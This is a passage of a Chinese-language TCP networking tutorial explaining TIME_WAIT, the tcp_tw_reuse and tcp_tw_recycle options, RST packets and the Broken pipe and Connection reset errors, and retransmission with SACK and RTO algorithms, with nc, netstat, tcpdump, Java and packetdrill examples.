从上面可以看到 TTL 说的是「跳数」限制而不是「时间」限制，尽管如此我们依然假设**最大跳数的报文在网络中存活的时间不可能超过 MSL 秒**。Linux 的套接字实现假设 MSL 为 30 秒，因此在 Linux 机器上 TIME_WAIT 状态将持续 60秒。

## 构造一个 TIME_WAIT

要构造一个 TIME_WAIT 非常简单，只需要建立一个 TCP 连接，然后断开某一方连接，主动断开的那一方就会进入 TIME_WAIT 状态，我们用 Linux 上开箱即用的 nc 命令来构造一个。过程如下图：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4b90306b56)



- 在机器 c2 上用`nc -l 8888`启动一个 TCP 服务器
- 在机器 c1 上用 `nc c2 8888` 创建一条 TCP 连接
- 在机器 c1 上用 `Ctrl+C` 停止 nc 命令，随后在用`netstat -atnp | grep 8888`查看连接状态。

```
netstat -atnp | grep 8888
tcp        0      0 10.211.55.5:60494       10.211.55.10:8888       TIME_WAIT   -
```

## TIME_WAIT 存在的原因是什么

第一个原因是：数据报文可能在发送途中延迟但最终会到达，因此要等老的“迷路”的重复报文段在网络中过期失效，这样可以避免用**相同**源端口和目标端口创建新连接时收到旧连接姗姗来迟的数据包，造成数据错乱。

比如下面的例子

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16dce163cb0bd1d8)



假设客户端 10.211.55.2 的 61594 端口与服务端 10.211.55.10 的 8080 端口一开始建立了一个 TCP 连接。

假如服务端发送完 FIN 包以后不等待直接进入 CLOSED 状态，老连接 SEQ=3 的包因为网络的延迟。过了一段时间**相同**的 IP 和端口号又新建了另一条连接，这样 TCP 连接的四元组就完全一样了。恰好 SEQ 因为回绕等原因也正好相同，那么 SEQ=3 的包就无法知道到底是旧连接的包还是新连接的包了，造成新连接数据的混乱。

TIME_WAIT 等待时间是 2 个 MSL，已经足够让一个方向上的包最多存活 MSL 秒就被丢弃，保证了在创建新的 TCP 连接以后，老连接姗姗来迟的包已经在网络中被丢弃消逝，不会干扰新的连接。

第二个原因是确保可靠实现 TCP 全双工终止连接。关闭连接的四次挥手中，最终的 ACK 由主动关闭方发出，如果这个 ACK 丢失，对端（被动关闭方）将重发 FIN，如果主动关闭方不维持 TIME_WAIT 直接进入 CLOSED 状态，则无法重传 ACK，被动关闭方因此不能及时可靠释放。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4bb50e0f93)



如果四次挥手的第 4 步中客户端发送了给服务端的确认 ACK 报文以后不进入 TIME_WAIT 状态，直接进入 `CLOSED`状态，然后重用端口建立新连接会发生什么呢？如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4bdb2a32f6)



主动关闭方如果马上进入 `CLOSED` 状态，被动关闭方这个时候还处于`LAST-ACK`状态，主动关闭方认为连接已经释放，端口可以重用了，如果使用相同的端口三次握手发送 SYN 包，会被处于 `LAST-ACK`状态状态的被动关闭方返回一个 `RST`，三次握手失败。

## 为什么时间是两个 MSL

- 1 个 MSL 确保四次挥手中主动关闭方最后的 ACK 报文最终能达到对端
- 1 个 MSL 确保对端没有收到 ACK 重传的 FIN 报文可以到达

2MS = 去向 ACK 消息最大存活时间（MSL) + 来向 FIN 消息的最大存活时间（MSL）

## TIME_WAIT 的问题

在一个非常繁忙的服务器上，如果有大量 TIME_WAIT 状态的连接会怎么样呢？

- 连接表无法复用
- socket 结构体内存占用

**连接表无法复用** 因为处于 TIME_WAIT 的连接会存活 2MSL（60s），意味着相同的TCP 连接四元组（源端口、源 ip、目标端口、目标 ip）在一分钟之内都没有办法复用，通俗一点来讲就是“占着茅坑不拉屎”。

假设主动断开的一方是客户端，对于 web 服务器而言，目标地址、目标端口都是固定值（比如本机 ip + 80 端口），客户端的 IP 也是固定的，那么能变化的就只有端口了，在一台 Linux 机器上，端口最多是 65535 个（ 2 个字节）。如果客户端与服务器通信全部使用短连接，不停的创建连接，接着关闭连接，客户端机器会造成大量的 TCP 连接进入 TIME_WAIT 状态。

可以来写一个简单的 shell 脚本来测试一下，使用 nc 命令连接 redis 发送 ping 命令以后断开连接。

```
for i in {1..10000}; do
    echo ping | nc localhost 6379
done
```

查看一下处于 TIME_WAIT 状态的连接的个数，短短的几秒钟内，TIME_WAIT 状态的连接已经有了 8000 多个。

```
netstat -tnpa | grep -i 6379 | grep  TIME_WAIT| wc -l
8192
```

如果在 60s 内有超过 65535 次 redis 短连接操作，就会出现端口不够用的情况，这也是使用连接池的一个重要原因。

## 应对 TIME_WAIT 的各种操作

针对 TIME_WAIT 持续时间过长的问题，Linux 新增了几个相关的选项，net.ipv4.tcp_tw_reuse 和 net.ipv4.tcp_tw_recycle。下面我们来说明一下这两个参数的用意。 这两个参数都依赖于 TCP 头部的扩展选项：timestamp

## TCP 头部时间戳选项（TCP Timestamps Option，TSopt）

除了我们之前介绍的 MSS、Window Scale 还有以一个非常重要的选项：时间戳（TCP Timestamps Option，TSopt）

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4c5c635f86)

它由四部分构成：类别（kind）、长度（Length）、发送方时间戳（TS value）、回显时间戳（TS Echo Reply）。时间戳选项类别（kind）的值等于 8，用来与其它类型的选项区分。长度（length）等于 10。两个时间戳相关的选线都是 4 字节。



如下图所示：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4be8611658)



是否使用时间戳选项是在三次握手里面的 SYN 报文里面确定的。下面的包是`curl github.com`抓包得到的结果。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4be8843d80)



- 发送方发送数据时，将一个发送时间戳 1734581141 放在发送方时间戳`TSval`中
- 接收方收到数据包以后，将收到的时间戳 1734581141 原封不动的返回给发送方，放在`TSecr`字段中，同时把自己的时间戳 3303928779 放在`TSval`中
- 后面的包以此类推



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4c5c7ae349)

有几个需要说明的点



- 时间戳是一个单调递增的值，与我们所知的 epoch 时间戳不是一回事。这个选项不要求两台主机进行时钟同步

- timestamps 是一个双向的选项，如果只要有一方不开启，双方都将停用 timestamps。比如下面是`curl www.baidu.com`得到的包

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4c6e0a8f69)

    可以看到客户端发起 SYN 包时带上了自己的TSval，服务器回复的SYN+ACK 包没有TSval和TSecr，从此之后的包都没有带上时间戳选项了。

    

有了这个选项，我们来看一下 tcp_tw_reuse 选项

## tcp_tw_reuse 选项

缓解紧张的端口资源，一个可行的方法是重用“浪费”的处于 TIME_WAIT 状态的连接，当开启 net.ipv4.tcp_tw_reuse 选项时，处于 TIME_WAIT 状态的连接可以被重用。下面把主动关闭方记为 A， 被动关闭方记为 B，它的原理是：

- 如果主动关闭方 A 收到的包时间戳比当前存储的时间戳小，说明是一个迷路的旧连接的包，直接丢弃掉
- 如果因为 ACK 包丢失导致被动关闭方还处于`LAST-ACK`状态，这时 A 发送SYN 包想三次握手建立连接，这个时候处于 `LAST-ACK` 阶段的被动关闭方 B 会回复 FIN，因为这时 A 处于`SYN-SENT`阶段会回以一个 RST 包给 B，B 这端的连接会进入 CLOSED 状态，A 因为没有收到 SYN 包的 ACK，会重传 SYN，后面就一切顺利了。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4c6fa323bd)



## tcp_tw_recyle 选项

tcp_tw_recyle 是一个比 tcp_tw_reuse 更激进的方案， 系统会缓存每台主机（即 IP）连接过来的最新的时间戳。对于新来的连接，如果发现 SYN 包中带的时间戳与之前记录的来自同一主机的同一连接的分组所携带的时间戳相比更旧，则直接丢弃。如果更新则接受复用 TIME-WAIT 连接。

这种机制在客户端与服务端一对一的情况下没有问题，如果经过了 NAT 或者负载均衡，问题就很严重了。

什么是 NAT呢？

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b54c4c703303df)



NAT（Network Address Translator）的出现是为了缓解 IP 地址耗尽的临时方案，IPv4 的地址是 32 位，全部利用最 多只能提 42.9 亿个地址，去掉保留地址、组播地址等剩下的只有 30 多亿，互联网主机数量呈指数级的增长，如果给每个设备都分配一个唯一的 IP 地址，那根本不够。于是 1994 年推出的 NAT 规范，NAT 设备负责维护局域网私有 IP 地址和端口到外网 IP 和端口的映射规则。

它有两个明显的优点

- 出口 IP 共享：通过一个公网地址可以让许多机器连上网络，解决 IP 地址不够用的问题
- 安全隐私防护：实际的机器可以隐藏自己真实的 IP 地址 当然也有明显的弊端：NAT 会对包进行修改，有些协议无法通过 NAT。

当 tcp_tw_recycle 遇上 NAT 时，因为客户端出口 IP 都一样，会导致服务端看起来都在跟同一个 host 打交道。不同客户端携带的 timestamp 只跟自己相关，如果一个时间戳较大的客户端 A 通过 NAT 与服务器建连，时间戳较小的客户端 B 通过 NAT 发送的包服务器认为是过期重复的数据，直接丢弃，导致 B 无法正常建连和发数据。

## 小结

TIME_WAIT 状态是最容易造成混淆的一个概念，这个状态存在的意义是

- 可靠的实现 TCP 全双工的连接终止（处理最后 ACK 丢失的情况）
- 避免当前关闭连接与后续连接混淆（让旧连接的包在网络中消逝）

## 习题

1、TCP 状态变迁中，存在 TIME_WAIT 状态，请问以下正确的描述是？

- A、TIME_WAIT 状态可以帮助 TCP 的全双工连接可靠释放
- B、TIME_WAIT 状态是 TCP 是三次握手过程中的状态
- C、TIME_WAIT 状态是为了保证重新生成的 socket 不受之前延迟报文的影响
- D、TIME_WAIT 状态是为了让旧数据包消失在网络中

## 思考题

假设 MSL 是 60s，请问系统能够初始化一个新连接然后主动关闭的最大速率是多少？（忽略1~1024区间的端口）

这篇文章我们来讲解 RST，RST 是 TCP 字发生错误时发送的一种分节，下面我们来介绍 RST 包出现常见的几种情况，方便你以后遇到 RST 包以后有一些思路。

在 TCP 协议中 RST 表示复位，用来**异常的**关闭连接，发送 RST 关闭连接时，不必等缓冲区的数据都发送出去，直接丢弃缓冲区中的数据，连接释放进入`CLOSED`状态。而接收端收到 RST 段后，也不需要发送 ACK 确认。

## RST 常见的几种情况

我列举了常见的几种会出现 RST 的情况

#### 端口未监听

这种情况很常见，比如 web 服务进程挂掉或者未启动，客户端使用 connect 建连，都会出现 "Connection Reset" 或者"Connection refused" 错误。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b6dd21761b9ffd)



这样机制可以用来检测对端端口是否打开，发送 SYN 包对指定端口，看会不会回复 SYN+ACK 包。如果回复了 SYN+ACK，说明监听端口存在，如果返回 RST，说明端口未对外监听，如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b6dd217748a3d1)



#### 一方突然断电重启，之前建立的连接信息丢失，另一方并不知道

这个场景在前面 keepalive 那里介绍过。客户端和服务器一开始三次握手建立连接，中间没有数据传输进入空闲状态。这时候服务器突然断电重启，之前主机上所有的 TCP 连接都丢失了，但是客户端完全不知晓这个情况。等客户端有数据有数据要发送给服务端时，服务端这边并没有这条连接的信息，发送 RST 给客户端，告知客户端自己无法处理，你趁早死了这条心吧。

整个过程如下图所示：



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b6dd2177aff16c)



#### 调用 close 函数，设置了 SO_LINGER 为 true

如果设置 SO_LINGER 为 true，linger 设置为 0，当调用 socket.close() 时， close 函数会立即返回，同时丢弃缓冲区内所有数据并立即发送 RST 包重置连接。在 SO_LINGER 那一节有详细介绍这个参数的含义。

## RST 包如果丢失了怎么办？

这是一个比较有意思的问题，首先需要明确 **RST 是不需要确认的**。 下面假定是服务端发出 RST。

在 RST 没有丢失的情况下，发出 RST 以后服务端马上释放连接，进入 CLOSED 状态，客户端收到 RST 以后，也立刻释放连接，进入 CLOSED 状态。

如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b6dd2176699765)



如果 RST 丢失呢？

服务端依然是在发送 RST 以后马上进入`CLOSED`状态，因为 RST 丢失，客户端压根搞不清楚状况，不会有任何动作。等到有数据需要发送时，一厢情愿的发送数据包给服务端。因为这个时候服务端并没有这条连接的信息，会直接回复 RST。

如果客户端收到了这个 RST，就会自然进入`CLOSED`状态释放连接。如果 RST 依然丢失，客户端只是会单纯的数据丢包了，进入数据重传阶段。如果还一直收不到 RST，会在一定次数以后放弃。

如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b6dd22e77ed16b)



## Broken pipe 与 Connection reset by peer

Broken pipe 与 Connection reset by peer 错误在网络编程中非常常见，出现的前提都是连接已关闭。

Connection reset by peer 这个错误很好理解，前面介绍了很多 RST 出现的场景。

`Broken pipe`出现的时机是：在一个 RST 的套接字继续写数据，就会出现`Broken pipe`。

下面来模拟 Broken pipe 的情况，服务端代码非常简单，几乎什么都没做，完整的代码见：[Server.java](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_rst/Server.java)

```
public class Server {
    public static void main(String[] args) throws Exception {
        ServerSocket serverSocket = new ServerSocket(9999);
        Socket socket = serverSocket.accept();
        OutputStream out = socket.getOutputStream();
        while (true) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String line = reader.readLine();
            System.out.println(">>>> process " + line);
            out.write("hello, this is server".getBytes());
        }
    }
```

使用`javac Server.java; javac -cp . Server`编译并运行服务端代码。

客户端代码如下，完整的代码见：[Client.java](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_rst/Client.java)

```
public class Client {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress("c2", 9999));

        OutputStream out = socket.getOutputStream();

        System.out.println("start sleep. kill server process now!");

        // 这个时候 kill 掉服务端进程
        TimeUnit.SECONDS.sleep(5);

        System.out.println("start first write");
        // 第一次 write，客户端并不知道连接已经不在了，这次 write 不会抛异常,只会触发 RST 包，应用层是收不到的
        out.write("hello".getBytes());

        TimeUnit.SECONDS.sleep(2);
        System.out.println("start second write");
        // 第二次 write, 触发 Broken Pipe
        out.write("world".getBytes());

        System.in.read();
    }
}
```

思路是先三次握手建连，然后马上 kill 掉服务端进程。客户端随后进行了两次 write，第一次 write 会触发服务端发送 RST 包，第二次 write 会抛出`Broken pipe`异常

```
start sleep. kill server process now!
start first write
start second write
Exception in thread "main" java.net.SocketException: Broken pipe
	at java.net.SocketOutputStream.socketWrite0(Native Method)
	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109)
	at java.net.SocketOutputStream.write(SocketOutputStream.java:141)
	at Client.main(Client.java:25)
```

抓包见下图，完整的 pcap 文件见：[broken_pipe.pcap](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_rst/broken_pipe.pcap)

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7073dc10282fd)



那 Broken pipe 到底是什么呢？这就要从 SIGPIPE 信号说起。

当一个进程向某个已收到 RST 的套接字执行写操作时，内核向该进程发送一个 SIGPIPE 信号。该信号的默认行为是终止进程，因此进程一般会捕获这个信号进行处理。不论该进程是捕获了该信号并从其信号处理函数返回，还是简单地忽略该信号，写操作都将返回 EPIPE 错误（也就Broken pipe 错误）,这也是 Broken pipe 只在写操作中出现的原因。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7073dca9493c8)



相比于 Broken pipe，Connection reset by peer 这个错误就更加容易出现一些了。一个最简单的方式是把上面代码中的第二次 write 改为 read，就会出现 `Connection reset`，完整的代码见：[Client2.java](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_rst/Client2.java)

运行日志如下：

```
start sleep. kill server process now!
start first write
start second write
Exception in thread "main" java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:209)
	at java.net.SocketInputStream.read(SocketInputStream.java:141)
	at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)
	at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)
	at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)
	at java.io.InputStreamReader.read(InputStreamReader.java:184)
	at java.io.BufferedReader.fill(BufferedReader.java:161)
	at java.io.BufferedReader.readLine(BufferedReader.java:324)
	at java.io.BufferedReader.readLine(BufferedReader.java:389)
	at Client.main(Client.java:28)
```

## 小结

这篇文章主要介绍了 RST 包相关的内容，我们来回顾一下。首先介绍了 RST 出现常见的几种情况

- 端口未监听
- 连接信息丢失，另一方并不知道继续发送数据
- SO_LINGER 设置丢弃缓冲区数据，立刻 RST

然后介绍了两个场景的错误 Connection reset 和 Broken pipe 以及背后的原因，RST 包的案例后面还有一篇文章会介绍。

## 重传示例

下面用 packetdrill 来演示丢包重传，模拟的场景如下图

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f8781a5d1b94)



packetdrill 脚本如下：

```
  1 0   socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
  2 +0  setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
  3 +0  bind(3, ..., ...) = 0
  4 +0  listen(3, 1) = 0
  5
  6 // 三次握手
  7 +0  < S 0:0(0) win 4000 <mss 1000>
  8 +0  > S. 0:0(0) ack 1 <...>
  9 +.1 < . 1:1(0) ack 1 win 4000
 10 +0  accept(3, ..., ...) = 4
 11
 12 // 往 fd 为 4 的 socket 文件句柄写入 1000 个字节数据（也即向客户端发送数据）
 13 +0  write(4, ..., 1000) = 1000
 14
 15 // 注释掉 向协议栈注入 ACK 包的代码，模拟客户端不回 ACK 包的情况
 16 // +.1 < . 1:1(0) ack 1001 win 1000
 17
 18 +0 `sleep 1000000`
```

- 1 ~ 4 行：新建 socket + bind + listen
- 7 ~ 9 行：三次握手 + accept 新的连接
- 13 行：服务端往新的 socket 连接上写入 1000 个字节的文件
- 16 行：正常情况下，客户端应该回复 ACK 包表示此前的 1000 个字节包已经收到，这里注释掉模拟 ACK 包丢失的情况。

使用 tcpdump 抓包保存为 pcap 格式，后面 wireshark 可以直接查看

```
sudo tcpdump -i any port 8080 -nn -A -w retrans.pcap
```

使用 wireshark 打开这个 pcap 文件，因为我们想看重传的时间间隔，可以在 wireshark 中设置时间的显示格式为显示包与包直接的实际间隔，更方便的查看重传间隔，步骤如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f878200ad2d8)

可以看到重传时间间隔是指数级退避，直到达到 120s 为止，总时间将近 15 分钟，重传次数是 15次 ，重传次数默认值由 /proc/sys/net/ipv4/tcp_retries2 决定（等于 15），会根据 RTO 的不同来动态变化。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f8781c8bd6d8)



整个过程如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f8781adaf048)



## 永远记住 ACK 是表示这之前的包都已经全部收到

如果发送 5000 个字节的数据包，因为 MSS 的限制每次传输 1000 个字节，分 5 段传输，如下图：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f8781978ccc9)

数据包 1 发送的数据正常到达接收端，接收端回复 ACK 1001，表示 seq 为1001之前的数据包都已经收到，下次从1001开始发。 数据包 2（10001：2001）因为某些原因未能到达服务端，其他包正常到达，这时接收端也不能 ack 3 4 5 数据包，因为数据包 2 还没收到，接收端只能回复 ack 1001。



第 2 个数据包重传成功以后服务器会回复5001，表示seq 为 5001 之前的数据包都已经收到了。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f8782193ca90)



## 快速重传机制与 SACK

文章一开始我们介绍了重传的时间间隔，要等几百毫秒才会进行第一次重传。聪明的网络协议设计者们想到了一种方法：**「快速重传」** 快速重传的含义是：当发送端收到 3 个或以上重复 ACK，就意识到之前发的包可能丢了，于是马上进行重传，不用傻傻的等到超时再重传。

这个有一个问题，发送 3、4、5 包收到的全部是 ACK=1001，快速重传解决了一个问题: 需要重传。因为除了 2 号包，3、4、5 包也有可能丢失，那到底是只重传数据包 2 还是重传 2、3、4、5 所有包呢？

聪明的网络协议设计者，想到了一个好办法

- 收到 3 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 **1000**（ACK=1001），[1:1001]、[2001:3001] 区间的包我也收到了
- 收到 4 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 **1000**（ACK=1001），[1:1001]、[2001:4001] 区间的包我也收到了
- 收到 5 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 **1000**（ACK=1001），[1:1001]、[2001:5001] 区间的包我也收到了

这样发送端就清楚知道只用重传 2 号数据包就可以了，数据包 3、4、5已经确认无误被对端收到。这种方式被称为 SACK（Selective Acknowledgment）。

如下图所示：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f8785971515d)



## 使用 packetdrill 演示快速重传

```
  1 --tolerance_usecs=100000
  // 常规操作：初始化
  2 0  socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
  3 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
  4 +0 bind(3, ..., ...) = 0
  5 +0 listen(3, 1) = 0
  6
  7 +0  < S 0:0(0) win 32792 <mss 1000,sackOK,nop,nop,nop,wscale 7>
  8 +0  > S. 0:0(0) ack 1 <...>
  9 +.1 < . 1:1(0) ack 1 win 257
 10
 11 +0 accept(3, ... , ...) = 4
 12 // 往客户端写 5000 字节数据
 13 +0.1 write(4, ..., 5000) = 5000
 14
 15 +.1 < . 1:1(0) ack 1001 win 257 <sack 1:1001,nop,nop>
 // 三次重复 ack
 16 +0  < . 1:1(0) ack 1001 win 257 <sack 1:1001 2001:3001,nop,nop>
 17 +0  < . 1:1(0) ack 1001 win 257 <sack 1:1001 2001:4001,nop,nop>
 18 +0  < . 1:1(0) ack 1001 win 257 <sack 1:1001 2001:5001,nop,nop>
 19 // 回复确认包，让服务端不再重试
 20 +.1 < . 1:1(0) ack 5001 win 257
 21
 22 +0 `sleep 1000000`
```

用 tcpdump 抓包以供 wireshark 分析`sudo tcpdump -i any port 8080 -nn -A -w fast_retran.pcap`，使用 packetdrill 执行上面的脚本。 可以看到，完全符合我们的预期，3 次重复 ACK 以后，过了15微妙，立刻进行了重传



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f878595513f8)



打开单个包的详情，在 ACK 包的 option 选项里，包含了 SACK 的信息，如下图：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1692f878596b44a2)

看了前面的重传的文章，你可能有一个疑惑，到底隔多久重传才是合适的呢？间隔设置比较长，包丢了老半天了才重传，效率较低。间隔设置比较短，可能包并没有丢就重传，增加网络拥塞，可能导致更多的超时和重发。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169ee07dddd6bf37)



因此间隔多久重传就是不是一成不变的，它随着不同的网络情况需要动态的进行调整，这个值就是今天要介绍的「超时重传的时间」（Retransmission TimeOut，RTO），它与 RTT 密切相关，下面我们来介绍几种计算 RTO 的方法

## 经典方法（适用 RTT 波动较小的情况）

一个最简单的想法就是取平均值，比如第一次 RTT 为 500ms，第二次 RTT 为 800ms，那么第三次发送时，各让一步取平均值 RTO 为 650ms。经典算法的思路跟取平均值是一样的，只不过系数不一样而已。

经典算法引入了「平滑往返时间」（Smoothed round trip time，SRTT）的概念：经过平滑后的RTT的值，每测量一次 RTT 就对 SRTT 作一次更新计算

```
SRTT = ( α * SRTT ) + ((1- α) * RTT)
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169ee07ddc1eb50a)



α 是平滑因子，建议值是0.8 ~ 0.9。假设平滑因子 α = 0.8，那么 SRTT = 80% 的原始值 + 20% 的新采样值。相当于一个低通滤波器。

- 当 α 趋近于 1 时，1 - α 趋近于 0，SRTT 越接近上一次的 SRTT 值，与新的 RTT 值的关系越小，表现出来就是对短暂的时延变化越不敏感。
- 当 α 趋近于 0 时，1 - α 趋近于 1，SRTT 越接近新采样的 RTT 值，与旧的 SRTT 值关系越小，表现出来就是对时延变化更敏感，能够更快速的跟随时延的变化而变化

超时重传时间 RTO 的计算公式是：

```
RTO = min(ubound, max(lbound, β * SRTT))
```

其中 β 是加权因子，一般推荐值为 1.3 ~ 2.0。ubound 为 RTO 的上界（upper bound），lbound 为 RTO 的下界（lower bound）。

这个公式的含义其实就是，RTO 是一个 1.3 倍到 2.0 倍的 SRTT 值，最大不超过最大值 ubound，最小不小于最小值 lbound



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169ee07dda466279)



这个算法下，平滑因子 α 取值范围是 0.8 ~ 0.9，RTT 对 RTO 的影响太小了，在相对稳定RTT 的网络环境中，这个算法表现还可以，如果在一个 RTT 变化较大的环境中，则效果较差。

于是出现了新的改进算法：标准方法。

## 标准方法（Jacobson / Karels 算法）

传统方法最大的问题是RTT 有大的波动时，很难即时反应到 RTO 上，因为都被平滑掉了。标准方法对 RTT 的采样增加了一个新的因素，

公式如下

```
SRTT = (1 -  α) * SRTT +  α * RTT
RTTVAR = (1 - β) * RTTVAR + β * (|RTT-SRTT|) 
RTO= µ * SRTT + ∂ * RTTVar
```

先来看第一个计算 SRTT 的公式

```
SRTT = (1 -  α) * SRTT +  α * RTT
```

这个公式与我们前面介绍的传统方法计算 SRTT 是一样的，都是新样本和旧值不同的比例权重共同构成了新的 SRTT 值，权重因子 α 的建议值是 0.125。在这种情况下， SRTT = 87.5% 的原始值 + 12.5% 的新采样值。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169ee07de17ecfec)



第二个公式是计算 RTTVAR：「已平滑的 RTT 平均偏差估计器」（round-trip time variation，RTTVAR）

```
RTTVAR = (1 - β) * RTTVAR + β * (|RTT-SRTT|) 
```



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169ee07ddd035fe4)



平均偏差是标准方差的良好近似，计算较为容易，无需标准方差的求平方根运算。如果 β 取建议值 0.25 则

```
RTTVAR  
= 0.75 * RTTVAR + 0.25 * (|RTT-SRTT|)
= 75% 的原始值 + 25% 的平滑 SRTT 与最新测量 RTT 的差值
```

第三个公式计算最终的 RTO 值

```
RTO = µ * SRTT + ∂ * RTTVAR 
```

μ 建议值取 1，∂ 建议值取 4，则

```
RTO = SRTT + 4 * RTTVAR
```

这种算法下 RTO 与 RTT 变化的差值关系更密切，能对变化剧烈的 RTT做出更及时的调整。

## 重传二义性与 Karn / Partridge 算法

前面的算法都很精妙，但是有一个最基本的问题还没解决，如何重传情况下计算 RTT，下面列举了三种常见的场景

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/169ee07dde3c896c)



当客户收到重传过的某个请求的一个应答时，它不能区分该应答对应哪一次请求。

- 如果用第一次发送数据的时间和收到 ACK 的时间来算 RTT，就会出现图 1 和图 2 中的问题，RTT 时间明显是大于实际值
- 如果用第二次发送数据的时间和收到 ACK 的时间差值来算 RTT，就会出现图 3 中的问题，RTT 时间明显小于实际值

上面的这种问题，就称为「重传二义性」（retransmission ambiguity problem）

Karn / Partridge 算法就是为了解决重传二义性的。它的思路也是很奇特，解决问题的最好办法就是不解决它：

- 既然不能确定 ACK 包到底对应重传包还是非重传包，那这次就忽略吧，这次重传的 RTT 不会被用来更新 SRTT 及后面的 RTO
- 只有当收到未重传过的某个请求的 ACK 包时，才更新 SRTT 等变量并重新计算RTO

仅仅有上面的规则是远远不够的，放弃掉重传那次不管看起来就像遇到危险把头埋在沙子里的鸵鸟。如果网络抖动，倒是突然出现大量重传，但这个时候 RTO 没有更新，就很坑了，本身 RTO 就是为了自适应网络延迟状况的，结果出问题了没有任何反应。这里 Karn 算法采用了出现重传就将 RTO 翻倍的方法，这就是我们前面看到过的指数级退避（Exponential backoff）。这种方式比较粗暴，但是非常简单。

## 小结

这篇文章我们讲了 RTO 的由来和计算 RTO 的经典方法和标准方法的计算方式：

- 经典方法：适用 RTT 波动较小的情况
- 标准方法：对 RTT 波动较大的情况下有更好的适应效果

最后的部分引入了「重传二义性」的概念，看到了计算重传情况下 RTT 的困难之处，由此引入了 Karn 算法：

